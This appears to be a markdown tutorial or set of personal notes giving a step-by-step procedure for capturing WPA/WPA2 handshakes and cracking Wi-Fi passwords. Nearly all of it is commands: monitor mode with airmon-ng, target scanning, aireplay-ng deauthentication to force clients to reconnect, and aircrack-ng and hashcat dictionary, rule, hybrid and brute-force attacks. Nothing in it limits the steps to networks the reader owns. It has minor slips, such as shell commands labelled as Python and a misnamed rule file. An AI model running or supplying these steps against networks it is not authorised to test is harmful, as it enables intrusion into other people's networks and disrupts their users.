**Tools to use:**
1. `Aircrack-ng` --> capture handshake and bruteforce
2. `hashcat` --> advance cracking algorithm

## How?
### Get the handshake
Use aircrack-ng to capture the handshake
1. Enter root to avoid typing sudo repeteadly
```pyhton
sudo su
```
2. check wireless interface
```python
iwconfig
```
3. kill conflicting process
```python
airmon-ng check kill
```
4.  start monitor mode
```python
airmon-ng start wlan0
```
Verify monitor mode:
```python
iwconfig
```
5. Scan all networks
```python
airodump-ng wlan0mon
```
This scans all channels and shows every Wi-Fi network in range.
6. Stop and Record Target Information
*ctrl + c to stop the scan*
   - important to notice:
     - BSSID (router mac address)
     - CH (Channel)
     - ESSID (network name)
7. Capturing the Handshake
```python
airodump-ng -c [CH] --bssid [BSSID] -w capture [interface_name]
```
- wait the handshake: [ WPA handshake: 12:34:56:78:9A:BC ] at top corner
- or force reconnection by opening new terminal and ```sudo su
aireplay-ng --deauth 10 -a 12:34:56:78:9A:BC wlan0mon```
8. ctrl + c to stop the capture
9. run crack
```python
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

### Crack the password
#### Method 1: dictionary attack
```python
aircrack-ng -w wordlist.txt capture-01.cap
```

#### Method 2: Rule-Based Attacks
```python
# Using Hashcat with rules
hashcat -m 2500 capture.hccapx -r best64.rule wordlist.txt
```

#### Method 3: Hybrid (Mask + Dictionary, Mode -a )
This combines a small, known pattern (a mask) with your dictionary. A common strategy is to prepend a four-digit year to every dictionary word.

Scenario: Password is a 4-digit PIN followed by a common word (e.g., 2025football).

Mask Syntax: ?d = digit (0-9). The mask is ?d?d?d?d.

```python
hashcat -m 22000 -a 7 -O my_hash.22000 ?d?d?d?d /path/to/wordlist.txt
```
#### Methid 4: Hybrid Attack (Dictionary + Mask, Mode -a 6)
This is the opposite of the above: it appends the mask to the dictionary word. A common strategy is appending a single digit to the end of a word.
- Scenario: Password is a common word followed by a single digit (e.g., password9).
- Mask Syntax: ?d = digit (0-9).

```python
hashcat -m 22000 -a 6 -O my_hash.22000 /path/to/wordlist.txt ?d
```

#### Method 5: Pure brute force
```python
# Try every possible combination (slowest)
hashcat -m 2500 capture.hccapx -a 3 ?a?a?a?a?a?a?a?a
```

#### Cracking Tools
**Hashcat (most powerfull)**
```python
# Convert .cap to .hccapx for Hashcat
cap2hccapx capture-01.cap capture.hccapx

# Crack with Hashcat
hashcat -m 2500 capture.hccapx /usr/share/wordlists/rockyou.txt
```

#### using hashcat
**prepare data hash file**
Hashcat requires the WPA/WPA2 handshake to be in a specific format, typically the 22000 hash format (a more modern, compact structure than the older .hccapx).

To convert your .cap file, you should use the official hcxtools suite, specifically the hcxpcapngtool utility, which is generally pre-installed on Linux distributions like Kali or Parrot.
```python
hcxpcapngtool -o my_hash.22000 -E essid_list.txt your_handshake.cap
```

#### attack
**Rule-Based Attack (Attack Mode -a 0)**
```python
hashcat -m 22000 -a 0 -O my_hash.22000 /path/to/wordlist.txt -r /path/to/hashcat/rules/best66.rule
```
how to find best66.rule file?
```find /usr -name best66.rule```

